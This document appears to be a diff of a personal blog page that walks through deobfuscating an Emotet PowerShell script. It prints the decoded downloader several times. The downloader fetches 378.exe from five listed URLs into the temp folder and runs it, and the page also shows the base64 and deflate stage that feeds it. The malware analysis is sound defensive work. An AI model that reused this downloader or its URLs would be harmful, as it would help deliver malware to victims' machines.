+            <p><strong>Purpose:</strong> Initializes a new <code>WebClient</code> object to handle HTTP requests, specifically for downloading files.</p>
+          </li>
+          <li><strong>URL List Initialization:</strong>
+            <pre><code>$OMS = 'http://cine80.co.kr/wvw/qhKE5rlkR@http://listyourhomes.ca/o5qDsWBe@http://hire-van.com/6dusyh9w3@http://icxturkey.com/nE2YMAjUK@http://spolarich.com/vlJ2o3k2h7'.Split('@');</code></pre>
+            <p><strong>Purpose:</strong> Defines a list of URLs separated by <code>@</code> and splits them into an array <code>$OMS</code>. These URLs are potential sources for downloading additional malicious payloads.</p>
+          </li>
+          <li><strong>Executable Naming and Path Construction:</strong>
+            <pre><code>$Xbd = '378';
+$rWQ = "$env:temp\$Xbd.exe";</code></pre>
+            <p><strong>Purpose:</strong> Constructs the path for the downloaded executable. The executable is named <code>378.exe</code> and is placed in the system's temporary directory.</p>
+          </li>
+          <li><strong>Download and Execution Loop:</strong>
+            <pre><code>
+foreach ($OWc in $OMS) {
+    try {
+        $qlK.DownloadFile($OWc, $rWQ);
+        Invoke-Item $rWQ;
+        break;
+    } catch {}
+}
+            </code></pre>
+            <p><strong>Purpose:</strong>
+              <ul>
+                <li><strong>Download Attempt:</strong> Iterates through each URL in <code>$OMS</code> and attempts to download the executable to <code>$rWQ</code>.</li>
+                <li><strong>Execution:</strong> If the download is successful, executes the downloaded file using <code>Invoke-Item</code>.</li>
+                <li><strong>Break on Success:</strong> Upon successful download and execution, breaks out of the loop to prevent further attempts.</li>
+                <li><strong>Silent Failure Handling:</strong> Any errors during download or execution are caught and ignored, ensuring the script doesn't raise alarms or halt execution.</li>
+              </ul>
+            </p>
+          </li>
+        </ol>
+        <p><strong>Implications:</strong></p>
+        <ul>
+          <li><strong>Malicious Intent:</strong> The script is designed to download and execute a potentially malicious executable from a list of predefined URLs.</li>
+          <li><strong>Redundancy and Resilience:</strong> Multiple URLs are provided to increase the likelihood of successful download, even if some URLs are blocked or non-responsive.</li>
+          <li><strong>Evasion Techniques:</strong> By placing the executable in the temporary directory and using non-descriptive naming (<code>378.exe</code>), the script aims to reduce the chances of detection.</li>
+        </ul>
+
+        <hr>
+
+        <h2 id="technical-analysis">Technical Analysis of the Final Payload</h2>
+        <p><strong>Objective:</strong> Understand the functionality and intent of the final payload.</p>
+        <p><strong>Decompressed Script:</strong></p>
+        <pre><code>
+$qlK = New-Object Net.WebClient;
+$OMS = 'http://cine80.co.kr/wvw/qhKE5rlkR@http://listyourhomes.ca/o5qDsWBe@http://hire-van.com/6dusyh9w3@http://icxturkey.com/nE2YMAjUK@http://spolarich.com/vlJ2o3k2h7'.Split('@');
+$Xbd = '378';
+$rWQ = "$env:temp\$Xbd.exe";
+foreach ($OWc in $OMS) {
+    try {
+        $qlK.DownloadFile($OWc, $rWQ);
+        Invoke-Item $rWQ;
+        break;
+    } catch {}
+}
+        </code></pre>
+        <p><strong>Detailed Breakdown:</strong></p>
+        <ol>
+          <li><strong>WebClient Object (`$qlK`):</strong>
+            <p>Utilized for HTTP operations, specifically downloading files from the internet.</p>
+          </li>
+          <li><strong>URL List (`$OMS`):</strong>
+            <p>Contains multiple URLs separated by <code>@</code>. These URLs are likely C2 (Command and Control) servers hosting additional malware payloads.</p>
+          </li>
+          <li><strong>Executable Naming (`$Xbd` and `$rWQ`):</strong>
+            <p><code>$Xbd</code> is set to <code>'378'</code>, and <code>$rWQ</code> constructs the path to <code>'378.exe'</code> in the temporary directory.</p>
+            <p><strong>Purpose:</strong> Minimizes the visibility of the executable by placing it in a less scrutinized directory with a generic name.</p>
+          </li>
+          <li><strong>Download and Execution Loop:</strong>
+            <pre><code>
+foreach ($OWc in $OMS) {
+    try {
+        $qlK.DownloadFile($OWc, $rWQ);
+        Invoke-Item $rWQ;
+        break;
+    } catch {}
+}
+            </code></pre>
+            <p><strong>Purpose:</strong>
+              <ul>
+                <li><strong>Download Attempt:</strong> Tries to download the executable from the current URL to <code>$rWQ</code>.</li>
+                <li><strong>Execution:</strong> If the download is successful, executes the file using <code>Invoke-Item</code>.</li>
+                <li><strong>Break on Success:</strong> Upon successful download and execution, breaks out of the loop to prevent further attempts.</li>
+                <li><strong>Silent Failure Handling:</strong> Any errors during download or execution are caught and ignored, enhancing stealth.</li>
+              </ul>
+            </p>
+          </li>
+        </ol>
+        <p><strong>Implications:</strong></p>
+        <ul>
+          <li><strong>System Compromise:</strong> Execution of the downloaded executable (<code>378.exe</code>) could lead to various malicious outcomes, including data theft, ransomware deployment, or further malware propagation.</li>
+          <li><strong>Persistence Mechanisms:</strong> While not evident in this script, downloaded executables often establish persistence to maintain access.</li>
+          <li><strong>Evasion of Security Measures:</strong> By using the temporary directory and generic naming, the malware aims to bypass user scrutiny and automated security scans.</li>
+        </ul>
+
+        <hr>
+
+        <h2 id="tools-and-resources">Tools and Resources</h2>
+        <p>To effectively reverse engineer and analyze such obfuscated scripts, the following tools and resources are invaluable:</p>
+        <ol>
+          <li>
+            <strong><a href="https://github.com/deobfshell/deobfshell" target="_blank" rel="noopener noreferrer">DeobfShell</a>:</strong> A tool designed to simplify and deobfuscate PowerShell scripts by parsing the .NET Framework's Abstract Syntax Tree (AST).
+            <p><em>Usage:</em> DeobfShell parses the AST to identify and refactor obfuscated elements, such as variable renaming and string manipulations, transforming the script into a more readable format.</p>
+          </li>
+          <li>
+            <strong><a href="https://gchq.github.io/CyberChef/" target="_blank" rel="noopener noreferrer">CyberChef</a>:</strong> A powerful web-based tool for encoding, decoding, and analyzing data.
+            <p><em>Usage:</em> Ideal for Base64 decoding, Deflate decompression, and experimenting with various data transformations.</p>
+          </li>
+          <li>
+            <strong>PowerShell ISE or VSCode with PowerShell Extensions:</strong> Integrated Development Environments (IDEs) for scripting and debugging PowerShell scripts.
+            <p><em>Usage:</em> Facilitates step-by-step execution and inspection of scripts without running malicious code.</p>
+          </li>
+          <li>
+            <strong><a href="https://www.volatilityfoundation.org/" target="_blank" rel="noopener noreferrer">Volatility</a>:</strong> For in-depth memory forensics and analysis.
+          </li>
+          <li>
+            <strong><a href="https://www.hex-rays.com/products/ida/" target="_blank" rel="noopener noreferrer">IDA Pro</a></strong> and <strong><a href="https://ghidra-sre.org/" target="_blank" rel="noopener noreferrer">Ghidra</a>:</strong> Disassemblers and debuggers for advanced static analysis of executables.
+          </li>
+          <li>
+            <strong><a href="https://cuckoosandbox.org/" target="_blank" rel="noopener noreferrer">Cuckoo Sandbox</a></strong> and <strong><a href="https://any.run/" target="_blank" rel="noopener noreferrer">Any.Run</a>:</strong> Malware analysis sandboxes for dynamic analysis.
+          </li>
+          <li>
+            <strong>Community and Research Reports:</strong> Stay updated with the latest Emotet research from cybersecurity firms like <strong>Proofpoint</strong>, <strong>FireEye</strong>, and <strong>Palo Alto Networks</strong>.
+          </li>
+        </ol>
+
+        <hr>
+
+        <h2 id="conclusion">Conclusion</h2>
+        <p>
+          Reverse engineering malicious PowerShell scripts, especially those from sophisticated malware like Emotet, demands a meticulous and structured approach. By deobfuscating the script, extracting and decoding embedded payloads, and analyzing the resultant commands, we can unveil the malicious intent and mechanisms employed by such threats.
+        </p>
+        <p>
+          In this walkthrough, we successfully deobfuscated an Emotet PowerShell script, decoded its Base64-encoded payload, decompressed it to reveal a malicious downloader script, and analyzed its operations. This process underscores the importance of understanding encoding and obfuscation techniques in malware analysis.
+        </p>
+        <p><strong>Key Takeaways:</strong></p>
+        <ul>
+          <li><strong>Obfuscation Complexity:</strong> Malware authors use advanced techniques to conceal their scripts, necessitating robust analysis methods.</li>
+          <li><strong>Tool Utilization:</strong> Leveraging tools like DeobfShell and CyberChef can significantly streamline the deobfuscation and decoding process.</li>
+          <li><strong>Security Best Practices:</strong> Always analyze malware in isolated environments to prevent accidental system compromise.</li>
+        </ul>
+
+        <hr>
+
+        <h2 id="disclaimer">Disclaimer</h2>
+        <p>
+          <strong>Caution:</strong> Handling and analyzing malware poses significant security risks. Ensure all activities are conducted within secure, isolated environments and comply with organizational policies and legal regulations. 
+          Never execute malicious scripts on production or personal systems.
+        </p>
+
+        <hr>
+
+        <p>
+          <strong>Stay vigilant and prioritize security to safeguard against evolving threats like Emotet! 🛡️</strong>
+        </p>
+
+        <!-- Navigation Links -->
+        <div style="margin: 40px 0; text-align: center;">
+          <a href="index.html" class="back-to-home">← Back to Home</a>
+        </div>
       </div>
+    </section>
+  </main>
 
-      <p>
-        At first glance, this script is deliberately obfuscated to conceal its malicious intent. Through a series of steps, including deobfuscation, decoding, and decompression, we can unravel its functionality.
-      </p>
+  <!-- Footer -->
+  <footer>
+    <p>&copy; <span id="year"></span> Justin Watson. All rights reserved.</p>
 
-      <hr>
-
-      <h2 id="reverse-engineering-process">Reverse Engineering Process</h2>
-      <p>
-        To effectively analyze this script, we'll follow a structured approach:
-      </p>
-      <ol>
-        <li>Deobfuscate the PowerShell Script</li>
-        <li>Extract the Base64 String</li>
-        <li>Decode the Base64 String</li>
-        <li>Decompress the Payload</li>
-        <li>Analyze the Decompressed Script</li>
-      </ol>
-
-      <h3 id="step-1-deobfuscating-the-powershell-script">Step 1: Deobfuscating the PowerShell Script</h3>
-      <p><strong>Objective:</strong> Simplify the obfuscated script to make its operations transparent.</p>
-      <p><strong>Approach:</strong></p>
-      <ul>
-        <li><strong>Identify Patterns and Common Techniques:</strong> Emotet often employs variable renaming, string manipulation, and dynamic method invocation.</li>
-        <li><strong>Use Deobfuscation Tools:</strong> Utilize repositories like <a href="https://github.com/deobfshell/deobfshell" target="_blank" rel="noopener noreferrer">DeobfShell</a> to parse and simplify the script.</li>
-      </ul>
-      <p><strong>Implementation:</strong></p>
-
-      <h4>1. Variable Renaming</h4>
-      <p>Replace nonsensical variable names with meaningful ones.</p>
-      <pre><code>
-    # Original
-    ${pC695I} = [tYpE]( "{2}{1}{0}{3}"-f'NM','O','eNvIR','ent' );
-    
-    # Simplified
-    $EnvironmentType = [Type]( "{2}{1}{0}{3}"-f'NM','O','eNvIR','ent' );  # Resolves to 'Environment'
-      </code></pre>
-
-      <h4>2. String Formatting</h4>
-      <p>Decode the string formatting to reveal actual method names.</p>
-      <pre><code>
-    # Original
-    "{2}{1}{0}{3}"-f'NM','O','eNvIR','ent'
-    
-    # Simplified
-    "eNvIR" + "O" + "NM" + "ent"  # Results in "Environment"
-      </code></pre>
-
-      <h4>3. Dynamic Method Invocation</h4>
-      <p>Understand how methods are being dynamically constructed and invoked.</p>
-      <pre><code>
-    # Original
-    ([STRINg]$vERBOSEprEFERENce)[1,3]+'x'-JOIn''
-    
-    # Simplified
-    ($VerbosePreference)[1,3] + 'x' -Join''  # Extracts characters at indices 1 and 3 and concatenates with 'x'
-    # Assuming $VerbosePreference = "SilentlyContinue", indices 1 and 3 correspond to 'i' and 'e', resulting in 'iex'
-      </code></pre>
-
-      <h4>4. Final Deobfuscated Script</h4>
-      <pre><code>
-    $EnvironmentType = [Type]("eNvIR" + "O" + "NM" + "ent");  # 'Environment'
-    $InvokeExpression = 'iex';  # Result from dynamic string construction
-    $Base64String = "NZBRa8IwFEb/Sh8CUZzpsDidoeA2HbiissnoBntp4x2JTZM2TVuL+N9Xy/p6z+HAd1EuA19BPdbxCZh1dmBJCPGLFKAsRfvtwcfc2mzhukwomN8Tpkli3Lqq3ZwH66mRycfy35CisI0uDdcpFIRFrp7mqyJ8hl7gwsC4ilQbSd2HY1k0/LH2eirY2ZYmgabDaj353j6dPoMeF5mWkRGMd7iSbxPtJRM+w+SQSWEHeImHFH3FR8d3sDebY4pM+O4jUNXCQpqN8A8e3fgIEzgDpr/aQMT4AO1D5gjl3NYOL9Y0F9R+hax0raSOjq9CQufcObfgkG5UpRMYb9pod6Fx20nolUWW8cv1+gc=";
-    $DecompressedData = [Text.Encoding]::ASCII.GetString([Compression.DeflateStream]::Decompress([MemoryStream]::new([Convert]::FromBase64String($Base64String))));
-    Invoke-Expression($DecompressedData);
-      </code></pre>
-
-      <div class="image-container">
-        <img src="https://i.imgur.com/GqPcPtJ.png" alt="Reformatted script with proper AST">
-        <figcaption>Figure 3: Reformatted PowerShell script with proper AST structure after deobfuscation.</figcaption>
-      </div>
-
-      <p><strong>Explanation:</strong></p>
-      <ul>
-        <li>The script constructs the string <code>'Environment'</code> to interact with environment variables.</li>
-        <li>It dynamically builds the <code>Invoke-Expression</code> (<code>iex</code>) command to execute the decompressed payload.</li>
-      </ul>
-
-      <h3 id="step-2-extracting-the-base64-string">Step 2: Extracting the Base64 String</h3>
-      <p><strong>Objective:</strong> Isolate the Base64-encoded string embedded within the script for decoding.</p>
-      <p><strong>Approach:</strong></p>
-      <ul>
-        <li><strong>Identify the Encoding Method:</strong> Emotet commonly uses Base64 encoding to embed payloads.</li>
-        <li><strong>Extract the String:</strong> Use pattern matching or manual extraction.</li>
-      </ul>
-      <p><strong>Implementation:</strong></p>
-      <p>From the deobfuscated script:</p>
-      <pre><code>
-    $Base64String = "NZBRa8IwFEb/Sh8CUZzpsDidoeA2HbiissnoBntp4x2JTZM2TVuL+N9Xy/p6z+HAd1EuA19BPdbxCZh1dmBJCPGLFKAsRfvtwcfc2mzhukwomN8Tpkli3Lqq3ZwH66mRycfy35CisI0uDdcpFIRFrp7mqyJ8hl7gwsC4ilQbSd2HY1k0/LH2eirY2ZYmgabDaj353j6dPoMeF5mWkRGMd7iSbxPtJRM+w+SQSWEHeImHFH3FR8d3sDebY4pM+O4jUNXCQpqN8A8e3fgIEzgDpr/aQMT4AO1D5gjl3NYOL9Y0F9R+hax0raSOjq9CQufcObfgkG5UpRMYb9pod6Fx20nolUWW8cv1+gc=";
-      </code></pre>
-      <p><strong>Outcome:</strong></p>
-      <p>The Base64 string is now isolated and ready for decoding.</p>
-
-      <h3 id="step-3-decoding-the-base64-string">Step 3: Decoding the Base64 String</h3>
-      <p><strong>Objective:</strong> Convert the Base64 string into a byte array for further processing.</p>
-      <p><strong>Approach:</strong></p>
-      <ul>
-        <li><strong>Use Decoding Tools:</strong> PowerShell, Python, or CyberChef can decode Base64 strings.</li>
-        <li><strong>Ensure Integrity:</strong> Verify that the decoded data matches expectations (e.g., correct byte length).</li>
-      </ul>
-      <p><strong>Implementation:</strong></p>
-      <p>Using PowerShell:</p>
-      <pre><code>
-    $Base64String = "NZBRa8IwFEb/Sh8CUZzpsDidoeA2HbiissnoBntp4x2JTZM2TVuL+N9Xy/p6z+HAd1EuA19BPdbxCZh1dmBJCPGLFKAsRfvtwcfc2mzhukwomN8Tpkli3Lqq3ZwH66mRycfy35CisI0uDdcpFIRFrp7mqyJ8hl7gwsC4ilQbSd2HY1k0/LH2eirY2ZYmgabDaj353j6dPoMeF5mWkRGMd7iSbxPtJRM+w+SQSWEHeImHFH3FR8d3sDebY4pM+O4jUNXCQpqN8A8e3fgIEzgDpr/aQMT4AO1D5gjl3NYOL9Y0F9R+hax0raSOjq9CQufcObfgkG5UpRMYb9pod6Fx20nolUWW8cv1+gc=";
-    $bytes = [Convert]::FromBase64String($Base64String);
-    Write-Output "Decoded Byte Array Length: $($bytes.Length) bytes";
-      </code></pre>
-      <p><strong>Output:</strong></p>
-      <pre><code>
-    Decoded Byte Array Length: 180 bytes
-      </code></pre>
-      <p><strong>Explanation:</strong></p>
-      <p>The Base64 string successfully decodes into a 180-byte array, ready for decompression.</p>
-
-      <h3 id="step-4-decompressing-the-payload">Step 4: Decompressing the Payload</h3>
-      <p><strong>Objective:</strong> Uncompress the decoded byte array to reveal the underlying PowerShell script.</p>
-      <p><strong>Approach:</strong></p>
-      <ul>
-        <li><strong>Identify Compression Method:</strong> Emotet typically uses the Deflate algorithm.</li>
-        <li><strong>Use Appropriate Tools:</strong> CyberChef allows specifying raw Inflate (Deflate without headers), which is essential when headers are absent.</li>
-      </ul>
-      <p><strong>Implementation:</strong></p>
-      <p>Using <strong>CyberChef</strong>:</p>
-      <ol>
-        <li><strong>Input:</strong> Paste the decoded byte array.</li>
-        <li><strong>Operation:</strong> Apply <code>Deflate Inflate (Raw)</code>.</li>
-        <li><strong>Output:</strong> Obtain the readable PowerShell script.</li>
-      </ol>
-      <p><strong>Result:</strong></p>
-
-      <div class="image-container">
-        <img src="https://i.imgur.com/2s996rx.png" alt="Decoded and decompressed script parameters">
-        <figcaption>Figure 4: Decoded and decompressed script parameters after applying raw Inflate.</figcaption>
-      </div>
-
-      <pre><code>
-    $qlK=new-object Net.WebClient;$OMS='http://cine80.co.kr/wvw/qhKE5rlkR@http://listyourhomes.ca/o5qDsWBe@http://hire-van.com/6dusyh9w3@http://icxturkey.com/nE2YMAjUK@http://spolarich.com/vlJ2o3k2h7'.Split('@');$Xbd = '378';$rWQ=$env:temp+'\'+$Xbd+'.exe';foreach($OWc in $OMS){try{$qlK.DownloadFile($OWc, $rWQ);Invoke-Item $rWQ;break;}catch{}}
-      </code></pre>
-      <p><strong>Explanation:</strong></p>
-      <p>The decompressed script is now readable and outlines its malicious intent.</p>
-
-      <hr>
-
-      <h3 id="step-5-analyzing-the-decompressed-script">Step 5: Analyzing the Decompressed Script</h3>
-      <p><strong>Objective:</strong> Understand the functionality and malicious operations of the decompressed script.</p>
-      <p><strong>Decompressed Script:</strong></p>
-      <pre><code>
-    $qlK=new-object Net.WebClient;
-    $OMS='http://cine80.co.kr/wvw/qhKE5rlkR@http://listyourhomes.ca/o5qDsWBe@http://hire-van.com/6dusyh9w3@http://icxturkey.com/nE2YMAjUK@http://spolarich.com/vlJ2o3k2h7'.Split('@');
-    $Xbd = '378';
-    $rWQ = $env:temp+'\'+$Xbd+'.exe';
-    foreach($OWc in $OMS){
-        try{
-            $qlK.DownloadFile($OWc, $rWQ);
-            Invoke-Item $rWQ;
-            break;
-        }
-        catch{}
-    }
-      </code></pre>
-
-      <p><strong>Detailed Breakdown:</strong></p>
-      <ol>
-        <li><strong>WebClient Object Creation:</strong>
-          <pre><code>$qlK = new-object Net.WebClient;</code></pre>
-          <p><strong>Purpose:</strong> Initializes a new <code>WebClient</code> object to handle HTTP requests, specifically downloading files.</p>
-        </li>
-        <li><strong>URL List Initialization:</strong>
-          <pre><code>$OMS = 'http://cine80.co.kr/wvw/qhKE5rlkR@http://listyourhomes.ca/o5qDsWBe@http://hire-van.com/6dusyh9w3@http://icxturkey.com/nE2YMAjUK@http://spolarich.com/vlJ2o3k2h7'.Split('@');</code></pre>
-          <p><strong>Purpose:</strong> Defines a list of URLs separated by <code>@</code> and splits them into an array <code>$OMS</code>. These URLs are potential sources for downloading additional malicious payloads.</p>
-        </li>
-        <li><strong>Executable Naming and Path Construction:</strong>
-          <pre><code>$Xbd = '378';
-    $rWQ = $env:temp + '\' + $Xbd + '.exe';</code></pre>
-          <p><strong>Purpose:</strong> Constructs the path for the downloaded executable. The executable is named <code>378.exe</code> and is placed in the system's temporary directory.</p>
-        </li>
-        <li><strong>Download and Execution Loop:</strong>
-          <pre><code>
-    foreach($OWc in $OMS){
-        try{
-            $qlK.DownloadFile($OWc, $rWQ);
-            Invoke-Item $rWQ;
-            break;
-        }
-        catch{}
-    }
-          </code></pre>
-          <p><strong>Purpose:</strong>
-            <ul>
-              <li><strong>Download Attempt:</strong> Tries to download the executable from the current URL to <code>$rWQ</code>.</li>
-              <li><strong>Execution:</strong> If the download is successful, executes the file using <code>Invoke-Item</code>.</li>
-              <li><strong>Break on Success:</strong> Upon successful download and execution, breaks out of the loop to prevent further attempts.</li>
-              <li><strong>Silent Failure Handling:</strong> Any errors during download or execution are caught and ignored, enhancing stealth.</li>
-            </ul>
-          </p>
-        </li>
-      </ol>
-      <p><strong>Implications:</strong></p>
-      <ul>
-        <li><strong>Malicious Intent:</strong> The script is designed to download and execute a potentially malicious executable from a list of predefined URLs.</li>
-        <li><strong>Redundancy and Resilience:</strong> Multiple URLs are provided to increase the likelihood of successful download, even if some URLs are blocked or non-responsive.</li>
-        <li><strong>Evasion Techniques:</strong> By placing the executable in the temporary directory and using non-descriptive naming (<code>378.exe</code>), the script aims to reduce the chances of detection.</li>
-      </ul>
-
-      <hr>
-
-      <h2 id="technical-analysis-of-the-final-payload">Technical Analysis of the Final Payload</h2>
-      <p><strong>Objective:</strong> Understand the functionality and intent of the final payload.</p>
-      <p><strong>Decompressed Script:</strong></p>
-      <pre><code>
-    $qlK=new-object Net.WebClient;
-    $OMS='http://cine80.co.kr/wvw/qhKE5rlkR@http://listyourhomes.ca/o5qDsWBe@http://hire-van.com/6dusyh9w3@http://icxturkey.com/nE2YMAjUK@http://spolarich.com/vlJ2o3k2h7'.Split('@');
-    $Xbd = '378';
-    $rWQ = $env:temp+'\'+$Xbd+'.exe';
-    foreach($OWc in $OMS){
-        try{
-            $qlK.DownloadFile($OWc, $rWQ);
-            Invoke-Item $rWQ;
-            break;
-        }
-        catch{}
-    }
-      </code></pre>
-      <p><strong>Detailed Breakdown:</strong></p>
-      <ol>
-        <li><strong>WebClient Object (`$qlK`):</strong>
-          <p>Utilized for HTTP operations, specifically downloading files from the internet.</p>
-        </li>
-        <li><strong>URL List (`$OMS`):</strong>
-          <p>Contains multiple URLs separated by <code>@</code>. These URLs are likely C2 (Command and Control) servers hosting additional malware payloads.</p>
-        </li>
-        <li><strong>Executable Naming (`$Xbd` and `$rWQ`):</strong>
-          <p><code>$Xbd</code> is set to <code>'378'</code>, and <code>$rWQ</code> constructs the path to <code>'378.exe'</code> in the temporary directory.</p>
-          <p><strong>Purpose:</strong> Minimizes the visibility of the executable by placing it in a less scrutinized directory with a generic name.</p>
-        </li>
-        <li><strong>Download and Execution Loop:</strong>
-          <pre><code>
-    foreach($OWc in $OMS){
-        try{
-            $qlK.DownloadFile($OWc, $rWQ);
-            Invoke-Item $rWQ;
-            break;
-        }
-        catch{}
-    }
-          </code></pre>
-          <p><strong>Purpose:</strong>
-            <ul>
-              <li><strong>Download Attempt:</strong> Tries to download the executable from the current URL to <code>$rWQ</code>.</li>
-              <li><strong>Execution:</strong> If the download is successful, executes the file using <code>Invoke-Item</code>.</li>
-              <li><strong>Break on Success:</strong> Upon successful download and execution, breaks out of the loop to prevent further attempts.</li>
-              <li><strong>Silent Failure Handling:</strong> Any errors during download or execution are caught and ignored, enhancing stealth.</li>
-            </ul>
-          </p>
-        </li>
-      </ol>
-      <p><strong>Implications:</strong></p>
-      <ul>
-        <li><strong>System Compromise:</strong> Execution of the downloaded executable (<code>378.exe</code>) could lead to various malicious outcomes, including data theft, ransomware deployment, or further malware propagation.</li>
-        <li><strong>Persistence Mechanisms:</strong> While not evident in this script, downloaded executables often establish persistence to maintain access.</li>
-        <li><strong>Evasion of Security Measures:</strong> By using the temporary directory and generic naming, the malware aims to bypass user scrutiny and automated security scans.</li>
-      </ul>
-
-      <hr>
-
-      <h2 id="tools-and-resources">Tools and Resources</h2>
-      <p>To effectively reverse engineer and analyze such obfuscated scripts, the following tools and resources are invaluable:</p>
-      <ol>
-        <li>
-          <strong><a href="https://github.com/deobfshell/deobfshell" target="_blank" rel="noopener noreferrer">DeobfShell</a>:</strong> A GitHub repository designed to simplify and deobfuscate PowerShell scripts.
-          <p><em>Usage:</em> Helps transform obfuscated scripts into more readable formats by parsing the Abstract Syntax Tree (AST).</p>
-        </li>
-        <li>
-          <strong><a href="https://gchq.github.io/CyberChef/" target="_blank" rel="noopener noreferrer">CyberChef</a>:</strong> A powerful web-based tool for encoding, decoding, and analyzing data.
-          <p><em>Usage:</em> Ideal for Base64 decoding, Deflate decompression, and experimenting with various data transformations.</p>
-        </li>
-        <li>
-          <strong>PowerShell ISE or VSCode with PowerShell Extensions:</strong> Integrated Development Environments (IDEs) for scripting and debugging PowerShell scripts.
-          <p><em>Usage:</em> Facilitates step-by-step execution and inspection of scripts without running malicious code.</p>
-        </li>
-        <li>
-          <strong><a href="https://www.volatilityfoundation.org/" target="_blank" rel="noopener noreferrer">Volatility</a>:</strong> For in-depth memory forensics and analysis.
-        </li>
-        <li>
-          <strong><a href="https://www.hex-rays.com/products/ida/" target="_blank" rel="noopener noreferrer">IDA Pro</a></strong> and <strong><a href="https://ghidra-sre.org/" target="_blank" rel="noopener noreferrer">Ghidra</a>:</strong> Disassemblers and debuggers for advanced static analysis of executables.
-        </li>
-        <li>
-          <strong><a href="https://cuckoosandbox.org/" target="_blank" rel="noopener noreferrer">Cuckoo Sandbox</a></strong> and <strong><a href="https://any.run/" target="_blank" rel="noopener noreferrer">Any.Run</a>:</strong> Malware analysis sandboxes for dynamic analysis.
-        </li>
-        <li>
-          <strong>Community and Research Reports:</strong> Stay updated with the latest Emotet research from cybersecurity firms like <strong>Proofpoint</strong>, <strong>FireEye</strong>, and <strong>Palo Alto Networks</strong>.
-        </li>
-      </ol>
-
-      <hr>
-
-      <h2 id="conclusion">Conclusion</h2>
-      <p>
-        Reverse engineering malicious PowerShell scripts, especially those from sophisticated malware like Emotet, demands a meticulous and structured approach. 
-        By deobfuscating the script, extracting and decoding embedded payloads, and analyzing the resultant commands, we can unveil the malicious intent and mechanisms employed by such threats.
-      </p>
-      <p>
-        In this walkthrough, we successfully deobfuscated an Emotet PowerShell script, decoded its Base64-encoded payload, decompressed it to reveal a malicious downloader script, and analyzed its operations. 
-        This process underscores the importance of understanding encoding and obfuscation techniques in malware analysis.
-      </p>
-      <p><strong>Key Takeaways:</strong></p>
-      <ul>
-        <li><strong>Obfuscation Complexity:</strong> Malware authors use advanced techniques to conceal their scripts, necessitating robust analysis methods.</li>
-        <li><strong>Tool Utilization:</strong> Leveraging tools like DeobfShell and CyberChef can significantly streamline the deobfuscation and decoding process.</li>
-        <li><strong>Security Best Practices:</strong> Always analyze malware in isolated environments to prevent accidental system compromise.</li>
-      </ul>
-
-      <hr>
-
-      <h2 id="disclaimer">Disclaimer</h2>
-      <p>
-        <strong>Caution:</strong> Handling and analyzing malware poses significant security risks. Ensure all activities are conducted within secure, isolated environments and comply with organizational policies and legal regulations. 
-        Never execute malicious scripts on production or personal systems.
-      </p>
-
-      <hr>
-
-      <p>
-        <strong>Stay vigilant and prioritize security to safeguard against evolving threats like Emotet! 🛡️</strong>
-      </p>
-
-      <!-- Navigation Links -->
-      <div style="margin: 40px 0; text-align: center;">
-        <a href="index.html" class="back-to-home">← Back to Home</a>
-      </div>
+    <div class="footer-socials">
+      <a href="https://bsky.app/profile/justwats.com" target="_blank" rel="noopener noreferrer">
+        <img src="/images/bluesky-svgrepo-com.svg" alt="Bluesky">
+      </a>
+      <a href="https://mastodon.social/@JustWats" target="_blank" rel="noopener noreferrer">
+        <img src="/images/mastodon-svgrepo-com.svg" alt="Mastodon">
+      </a>
+      <a href="https://github.com/JustWats" target="_blank" rel="noopener noreferrer">
+        <img src="/images/github-svgrepo-com.svg" alt="GitHub">
+      </a>
+      <a href="https://www.linkedin.com/in/justwats" target="_blank" rel="noopener noreferrer">
+        <img src="/images/linkedin-svgrepo-com.svg" alt="LinkedIn">
+      </a>
+      <a href="mailto:mail@justwats.com">
+        <img src="/images/email-svgrepo-com.svg" alt="Email">
+      </a>
     </div>
-  </section>
-</main>
 
-<!-- Footer -->
-<footer>
-  <p>&copy; <span id="year"></span> Justin Watson. All rights reserved.</p>
+    <script>
+      document.getElementById('year').textContent = new Date().getFullYear();
+    </script>
+  </footer>
 
-  <div class="footer-socials">
-    <a href="https://bsky.app/profile/justwats.com" target="_blank" rel="noopener noreferrer">
-      <img src="/images/bluesky-svgrepo-com.svg" alt="Bluesky">
-    </a>
-    <a href="https://mastodon.social/@JustWats" target="_blank" rel="noopener noreferrer">
-      <img src="/images/mastodon-svgrepo-com.svg" alt="Mastodon">
-    </a>
-    <a href="https://github.com/JustWats" target="_blank" rel="noopener noreferrer">
-      <img src="/images/github-svgrepo-com.svg" alt="GitHub">
-    </a>
-    <a href="https://www.linkedin.com/in/justwats" target="_blank" rel="noopener noreferrer">
-      <img src="/images/linkedin-svgrepo-com.svg" alt="LinkedIn">
-    </a>
-    <a href="mailto:mail@justwats.com">
-      <img src="/images/email-svgrepo-com.svg" alt="Email">
-    </a>
-  </div>
-
+  <!-- Scripts -->
   <script>
-    document.getElementById('year').textContent = new Date().getFullYear();
-  </script>
-</footer>
+    const splash = document.getElementById('splash');
+    const splashDragOverlay = document.getElementById('splashDragOverlay');
+    const introAudio = document.getElementById('introAudio');
+    const mainframeIntro = document.getElementById('mainframeIntro');
+    const audioToggle = document.getElementById('audioToggle');
+    const shuffleButton = document.getElementById('shuffleButton');
+    const volumeSlider = document.getElementById('volumeSlider');
+    const introLine1 = document.getElementById('introLine1');
+    const introLine2 = document.getElementById('introLine2');
 
-<!-- Scripts -->
-<script>
-  // Reuse the same scripts from index.html
-  const splash = document.getElementById('splash');
-  const splashDragOverlay = document.getElementById('splashDragOverlay');
-  const introAudio = document.getElementById('introAudio');
-  const mainframeIntro = document.getElementById('mainframeIntro');
-  const audioToggle = document.getElementById('audioToggle');
-  const shuffleButton = document.getElementById('shuffleButton');
-  const volumeSlider = document.getElementById('volumeSlider');
-  const introLine1 = document.getElementById('introLine1');
-  const introLine2 = document.getElementById('introLine2');
+    let startY = 0;
+    let currentY = 0;
+    let isDragging = false;
+    let audioStarted = false;
+    const threshold = 100; 
 
-  let startY = 0;
-  let currentY = 0;
-  let isDragging = false;
-  let audioStarted = false;
-  const threshold = 100; 
-
-  // Array of songs
-  const songs = [
-    "https://files.catbox.moe/4e75y2.mp3",
-    "https://files.catbox.moe/gyhnmf.mp3",
-    "https://files.catbox.moe/i0zvrf.mp3"
-  ];
-  introAudio.loop = false;
-  let currentSongIndex = -1;
-  // Play the next song in the queue
-  function playNextSong() {
-    currentSongIndex = (currentSongIndex + 1) % songs.length;
-    introAudio.src = songs[currentSongIndex];
-    introAudio.play();
-  }
-  
-  // Shuffle the playlist
-  function shuffleSongs() {
-    const remainingSongs = songs.filter((_, index) => index !== currentSongIndex); // Exclude the current song
